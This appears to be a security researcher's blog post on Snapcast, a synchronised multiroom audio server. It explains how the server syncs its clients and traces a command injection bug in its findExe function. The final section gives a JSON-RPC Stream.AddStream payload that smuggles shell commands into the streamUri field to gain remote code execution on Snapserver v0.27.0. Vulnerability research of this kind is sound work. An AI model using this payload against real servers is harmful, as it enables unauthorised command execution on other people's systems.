# Preface
Once upon a time, I went to the Danish hacking festival [Bornhack](https://bornhack.dk/bornhack-2023/). While there, fun was had, things were hacked, and wine was drunk. In one of the larger tents, that worked as a sort of meeting point, some people had set up an IoT streaming service, that allowed everyone to install a client on their phone, and listen to the same music, in camp, out of camp, and it was very synchronized! But what if that could be exploited?

# Background information about Snapcast
* Quick PSA: There's no hacking in this section.
### What is Snapcast
Snapcast is a **s**ynchro**n**ous multiroom **a**udio **p**layer. This is where the acronym `SNAP` comes from. It's not a standalone player, but instead a service, which attempts to turn your devices, for example old phones, laptops, etcetera, into a Sonos-like soundsystem. It's an open source project, with 5.3k starts on Github as of writing this.

### Server client relationship
There are two types of clients in Snapcast. There's the `Control Clients` and the `Streaming Clients`, and then of course the server, also called `Snapserver`. The server can be reached through TCP, HTTP, or Websockets using a JSON-RPC API. Using this API it's possible to set client's volume, mute clients, rename clients, assign a client to a stream, or manage groups. The typical TCP port used for Snapcast is port 1705. The RPC API is pretty well documented on their [github](https://github.com/badaix/snapcast/blob/develop/doc/json_rpc_api/control.md). 

### How does it work?
Using one of the stream sources, this can for example be the stdout of a process, it's possible to turn data into chunks, using some of the supported codecs, for example `FLAC` or `PCM`. These chunks are sent with timestamps from the server, and later on the client site decoded using a systems level audio API, resulting in music being played. It's quite interesting how this works, and one of the standard streams `/tmp/snapfifo`, can be used for testing connection, by piping data from `/dev/urandom` into it, and you'll hear a bunch of noise.

### How is it synchronizing?
One of the cool things about Snapcast is, that it's very synchronized. When we were using it at the festival, I was surprised at how I could walk from speaker to speaker, and not notice the latency between the two - maybe I'm easily impressed. The documentation for Snapcast describes their algorithm for achieving this low delay as follows:

1. Client sends a `Time` message, carrying a `client_sent` timestamp
2. Receives a `Time` response containing the client to server time delta. `(server_received - client_sent) + network_latency` and the server sent timestamp `server_sent`.
3. Client calculates the latency from server to client using `(client_recv - server_sent) + network_latency`
4. Calculates the difference between the server and client as `(client_to_server_time - server_to_client_time) / 2`

I'm not completely sure if it's the exact same as the time synchronization algorithm called [Christians Algorithm](https://www.cs.utexas.edu/users/lorenzo/corsi/cs380d/papers/Cristian.pdf), but it looks very similar. The reason for this synchronization is that, then the local time on each of the clients will be the same (of course with some latency), and without this sync, it would be very hard to keep that just based on your local system clock.

# Exploitation
### Finding the bug
I was inspired by my friend Oxnan's [post](http://oxnan.com/posts/Snapcast_jsonrpc_rce), on a bug he found, and I was in need of a project, turns out I would only be spending about 2 hours total on this (excluding this post). In the file `process_stream.cpp`, there was an interesting function called `findExe`: 
```cpp
std::string ProcessStream::findExe(const std::string& filename) const
{
    /// check if filename exists
    if (utils::file::exists(filename))
        return filename;

    ...

    /// check with "which"
    string which = execGetOutput("which " + exe);
    if (!which.empty())
        return which;

    ...
}
```
Specifically interesting is the line:
```cpp
string which = execGetOutput("which " + exe);
```
This smells a lot like command injection. It is. Now we want to figure out if it's reachable from the client. We're crossing our fingers. Let's see where it's being used:
```cpp
/// process_stream.cpp
void ProcessStream::initExeAndPath(const std::string& filename)
{
    path_ = "";
    exe_ = findExe(filename);
```

```cpp
/// librespot_stream.cpp
void LibrespotStream::initExeAndPath(const std::string& filename)
{
    path_ = "";
    exe_ = findExe(filename);
```

```cpp
/// airplay_stream.cpp
void AirplayStream::initExeAndPath(const string& filename)
{
    path_ = "";
    exe_ = findExe(filename);
```

We see there's three streams where this is being used. This function is called when these streams are being instantiated using `Stream.AddStream` with `streamUri` set. Specifically this is the function being called:
```cpp
PcmStreamPtr StreamManager::addStream(StreamUri& streamUri) 
{
    ...
    else if (streamUri.scheme == "airplay")
    {
        streamUri.query[kUriSampleFormat] = "44100:16:2";
        stream = make_shared<AirplayStream>(pcmListener_, io_context_, settings_, streamUri);
    }
}
```
We see that, an object of, in this case AirplayStream is being created when this is the scheme in the URI. At some point during this creation, it will need to return to the server a handler for the pipe or process, that's going to be serving the data chunks of audio encoded using one of the codecs to the client. It's very keen on this handler existing, so they check it thoroughly, sadly they don't check the user input properly when doing this. Now to exploit this, we need to use the JSON RPC along with the `Stream.AddStream` functionality. Looking at the documentation a bit, we'll come up with something like this:
```json
{
    "id": 8,
    "jsonrpc": "2.0",
    "method": "Stream.AddStream",
    "params": {
        "streamUri": f"airplay:///etc/doesnt_exist; whoami > pwned; sleep 10?name={streamname}"
    },
}
```
And now we have RCE on the Snapserver v0.27.0. I used the POC from the blog post earlier as a template for my own, so go read the post Oxnan made. Note this is not properly weaponized, and since this is being passed in a URI, you'll need to be smart about it, you cannot use commands that have `/` in them for example, but this is relatively simple to work around, and is left as an exercise for the reader.
